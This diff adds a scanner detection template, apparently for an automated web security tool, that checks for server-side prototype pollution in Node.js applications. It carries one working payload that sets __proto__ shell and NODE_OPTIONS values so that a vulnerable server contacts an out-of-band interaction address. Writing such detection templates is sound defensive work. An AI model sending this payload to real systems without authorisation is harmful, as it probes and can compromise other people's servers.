@@ -1,0 +1,17 @@
+id: server-side-prototype-pollution-oob
+issue_code: server_side_prototype_pollution
+detection_conditions: or
+detection_methods:
+  - oob_interaction:
+      oob_address: "{{.oob_address}}"
+      confidence: 90
+vars:
+  - name: oob_address
+    value: "{{interactionAddress | escapeDots}}"
+templates:
+  - '{"__proto__":{"argv0":"node","shell":"node","NODE_OPTIONS":"--inspect={{.oob_address}}"}}'
+categories:
+  - oob
+  - prototype_pollution
+credits:
+  - https://portswigger.net/research/server-side-prototype-pollution
